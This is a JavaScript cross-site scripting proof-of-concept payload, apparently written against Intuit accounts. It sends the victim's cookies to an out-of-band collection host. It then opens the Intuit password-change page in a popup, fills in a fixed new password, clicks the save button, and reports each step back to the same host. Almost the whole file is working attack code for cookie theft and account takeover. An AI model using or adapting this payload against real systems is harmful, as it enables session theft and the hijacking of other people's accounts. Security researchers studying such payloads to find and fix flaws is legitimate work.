(function(){
var O='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun';
var log=[];

function gc(n){
var m=document.cookie.match(new RegExp('(?:^|;\\s*)'+n.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+'=([^;]*)'));
return m?decodeURIComponent(m[1]):''
}

(new Image).src=O+'/xss-p9?c='+encodeURIComponent(document.cookie.substring(0,2000));

log.push('origin: '+location.origin);
log.push('cookies: '+document.cookie.length+' chars');

var w=window.open('https://accounts.intuit.com/app/account-manager/security/password','_blank','width=500,height=600');

if(!w||w.closed){
log.push('popup blocked');
(new Image).src=O+'/p9-blocked?t='+Date.now();

document.body.innerHTML='<div style="font:16px monospace;background:#111;color:#f00;padding:30px">'
+'<h1>Popup Blocked</h1>'
+'<p style="color:#ff0">Allow popups for accounts.intuit.com and try again.</p>'
+'<p style="color:#0f0">Cookies were still exfiltrated to attacker server.</p></div>';
return
}

log.push('popup opened');

document.body.innerHTML='<div id="s" style="font:13px monospace;background:#111;color:#0f0;padding:20px">'
+'<h2 style="color:#ff0">XSS PoC — Password Change via Popup</h2>'
+'<div id="log">Waiting for SPA to render password form...</div></div>';

var logEl=document.getElementById('log');
function updateLog(){logEl.innerHTML='<pre>'+log.join('\n')+'</pre>'}

var tries=0;
var maxTries=45;

var interval=setInterval(function(){
tries++;
try{
var doc=w.document;
var url=w.location.href;
log.push('try '+tries+': url='+url.substring(0,80));

var inputs=doc.querySelectorAll('input[type="password"]');
var allInputs=doc.querySelectorAll('input');
log.push('  password inputs: '+inputs.length+', all inputs: '+allInputs.length);

var bodyLen=doc.body?doc.body.innerText.length:0;
log.push('  body text length: '+bodyLen);

if(bodyLen>100 && inputs.length===0 && tries<maxTries){
var snippet=doc.body.innerText.substring(0,200).replace(/\n/g,' ');
log.push('  page text: '+snippet);
}

updateLog();

if(inputs.length>=2){
clearInterval(interval);
log.push('FOUND '+inputs.length+' password fields!');

var setter=Object.getOwnPropertyDescriptor(w.HTMLInputElement.prototype,'value').set;
var pwd='Poc@2027';

for(var i=0;i<inputs.length;i++){
setter.call(inputs[i],pwd);
inputs[i].dispatchEvent(new w.Event('input',{bubbles:true}));
inputs[i].dispatchEvent(new w.Event('change',{bubbles:true}));
inputs[i].dispatchEvent(new w.Event('blur',{bubbles:true}));
log.push('filled input['+i+'] name="'+inputs[i].name+'" id="'+inputs[i].id+'"');
}

log.push('looking for save/submit button...');
updateLog();

setTimeout(function(){
var btns=w.document.querySelectorAll('button');
var saveBtn=null;
for(var j=0;j<btns.length;j++){
var txt=btns[j].textContent.trim().toLowerCase();
if(txt==='save'||txt==='update password'||txt==='change password'||txt==='submit'){
saveBtn=btns[j];break
}
}
if(!saveBtn){
for(var j2=0;j2<btns.length;j2++){
var txt2=btns[j2].textContent.trim().toLowerCase();
if(txt2.indexOf('save')!==-1||txt2.indexOf('update')!==-1||txt2.indexOf('change')!==-1){
saveBtn=btns[j2];break
}
}
}
if(!saveBtn){
var submits=w.document.querySelectorAll('button[type="submit"],input[type="submit"]');
if(submits.length) saveBtn=submits[0];
}

if(saveBtn){
log.push('clicking: "'+saveBtn.textContent.trim()+'"');
updateLog();
saveBtn.click();

setTimeout(function(){
log.push('=== PASSWORD CHANGE SUBMITTED ===');
var finalText=w.document.body?w.document.body.innerText.substring(0,500):'';
log.push('page after submit: '+finalText.replace(/\n/g,' '));
(new Image).src=O+'/p9-done?log='+encodeURIComponent(log.join('|').substring(0,2000));
updateLog();
document.getElementById('s').innerHTML='<h1 style="color:red">XSS PoC — Password Changed!</h1>'
+'<pre style="color:#0f0">'+log.join('\n')+'</pre>'
+'<p style="color:#ff0;font-size:18px">New password: <b>Poc@2027</b></p>';
},4000);
}else{
log.push('no save button found');
var btnList=[];
for(var k=0;k<btns.length;k++) btnList.push('"'+btns[k].textContent.trim()+'"');
log.push('all buttons: '+btnList.join(', '));
(new Image).src=O+'/p9-nobtn?btns='+encodeURIComponent(btnList.join(',').substring(0,1000));
updateLog();
}
},1500);

}else if(tries>=maxTries){
clearInterval(interval);
log.push('TIMEOUT after '+maxTries+' tries');
if(doc.body){
var finalSnippet=doc.body.innerText.substring(0,500).replace(/\n/g,' ');
log.push('final page: '+finalSnippet);
}
var allTags=doc.querySelectorAll('*');
log.push('total DOM elements: '+allTags.length);
(new Image).src=O+'/p9-timeout?log='+encodeURIComponent(log.join('|').substring(0,2000));
updateLog();
}
}catch(e){
log.push('try '+tries+' ERR: '+e.message);
updateLog();
if(tries>=maxTries){
clearInterval(interval);
(new Image).src=O+'/p9-err?e='+encodeURIComponent(e.message);
}
}
},1500);
})();
